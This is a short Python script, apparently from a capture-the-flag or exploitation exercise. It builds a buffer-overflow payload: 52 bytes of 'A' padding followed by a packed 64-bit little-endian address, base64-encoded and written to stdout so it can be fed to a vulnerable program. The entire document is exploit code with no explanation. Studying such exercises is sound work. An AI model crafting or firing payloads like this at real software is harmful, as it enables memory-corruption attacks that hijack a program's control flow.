
import sys
import struct
import base64

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
buf += struct.pack('<Q', 16049355358195135344)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
